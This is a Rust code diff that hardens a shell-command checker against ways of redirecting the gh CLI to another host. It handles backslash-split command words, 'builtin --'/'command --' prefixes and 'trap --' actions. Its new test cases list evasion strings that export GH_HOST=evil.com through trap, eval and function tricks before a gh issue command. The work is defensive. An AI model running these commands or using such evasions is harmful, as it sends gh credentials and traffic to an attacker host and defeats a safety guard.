@@ -835,18 +835,24 @@ impl GhHostEnv {
         }
         let assignments = words.iter().take_while(|w| is_shell_assignment(w)).count();
         let (prefix, mut rest) = words.split_at(assignments);
-        // `builtin export …` / `command export …` run the same builtin.
+        // `builtin export …` / `command export …` (and their `--` spelling) run
+        // the same builtin.
         while rest
             .first()
-            .is_some_and(|w| matches!(w.trim_start_matches('\\'), "builtin" | "command"))
-            && rest.get(1).is_some_and(|w| !w.starts_with('-'))
+            .is_some_and(|w| matches!(w.replace('\\', "").as_str(), "builtin" | "command"))
         {
-            rest = &rest[1..];
+            match rest.get(1).map(String::as_str) {
+                Some("--") => rest = &rest[2..],
+                Some(next) if !next.starts_with('-') => rest = &rest[1..],
+                _ => break,
+            }
         }
-        // A leading backslash only suppresses alias expansion: `\trap` is `trap`.
-        let command = rest
+        // Backslashes in a command word only suppress alias expansion: `\trap`
+        // and `t\rap` are both `trap`.
+        let command_word = rest
             .first()
-            .map(|w| w.rsplit('/').next().unwrap_or(w).trim_start_matches('\\'));
+            .map(|w| w.rsplit('/').next().unwrap_or(w).replace('\\', ""));
+        let command = command_word.as_deref();
 
         // FAIL CLOSED where the command position was not understood: a
         // subshell, function body or case arm this normalization missed still
@@ -914,9 +920,15 @@ impl GhHostEnv {
         // `eval` string (#1073 review). `trap -p`, `trap -l` and `trap - SIG`
         // run nothing.
         if command == Some("trap") {
-            let args = &rest[1..];
-            let args = args.strip_prefix(&["--".to_string()]).unwrap_or(args);
-            if let Some(action) = args.first().filter(|a| !a.starts_with('-')) {
+            // After `--` a leading dash is part of the action, and only an
+            // action of exactly `-` (reset) runs nothing. Without `--`, a
+            // leading dash is an option (`-p`, `-l`) or that same reset.
+            let action = match rest[1..].split_first() {
+                Some((first, tail)) if first == "--" => tail.first().filter(|a| *a != "-"),
+                Some((first, _)) => Some(first).filter(|a| !a.starts_with('-')),
+                None => None,
+            };
+            if let Some(action) = action {
                 self.observe_nested(action, depth);
             }
         }
@@ -7084,6 +7096,17 @@ mod tests {
             "trap 'export GH_HOS''T=evil.com' DEBUG; gh issue create -R cameronsjo/x -t a -b b",
             "trap -- 'export GH_HOST=evil.com' DEBUG; gh issue create -R cameronsjo/x -t a -b b",
             "trap \"$CMD\" DEBUG; gh issue create -R cameronsjo/x -t a -b b",
+            // Narrow review I-1: after `--`, a leading dash is the action.
+            "trap -- '-x; export GH_HOST=evil.com' DEBUG; gh issue create -R cameronsjo/x -t a -b b",
+            "trap -- '- ; export GH_HOST=evil.com' DEBUG; gh issue create -R cameronsjo/x -t a -b b",
+            // Narrow review I-2: `--` after builtin/command, backslashes inside.
+            "command -- trap 'export GH_HOST=evil.com' DEBUG; gh issue create -R cameronsjo/x -t a -b b",
+            "builtin -- trap 'export GH_HOST=evil.com' DEBUG; gh issue create -R cameronsjo/x -t a -b b",
+            "t\\rap 'export GH_HOST=evil.com' DEBUG; gh issue create -R cameronsjo/x -t a -b b",
+            "e\\val 'export GH_HOST=evil.com'; gh issue create -R cameronsjo/x -t a -b b",
+            "command -- eval 'export GH_HOST=evil.com'; gh issue create -R cameronsjo/x -t a -b b",
+            // N-2: a function named as the action.
+            "f(){ export GH_HOST=evil.com; }; trap f DEBUG; gh issue create -R cameronsjo/x -t a -b b",
             // I-3: eval of an expansion.
             "eval \"$(printf 'export GH_HOS%s=evil.com' T)\"; gh issue create -R cameronsjo/x -t a -b b",
             "eval \"$X\"; gh issue create -R cameronsjo/x -t a -b b",
@@ -7095,6 +7118,8 @@ mod tests {
             "tmp=$(mktemp); trap 'rm -f \"$tmp\"' EXIT; gh issue comment 1 -R cameronsjo/x --body-file \"$tmp\"",
             "trap cleanup EXIT; gh issue create -R cameronsjo/x -t a -b b",
             "trap - EXIT; trap -p; gh issue create -R cameronsjo/x -t a -b b",
+            "trap -- - EXIT; trap -l; gh issue create -R cameronsjo/x -t a -b b",
+            "command -- echo hi; gh issue create -R cameronsjo/x -t a -b b",
             "grep -rn trap src; gh issue create -R cameronsjo/x -t a -b b",
             "eval 'echo hi'; gh issue create -R cameronsjo/x -t a -b b",
             // N-1: a bare `=` in a test is no assignment.
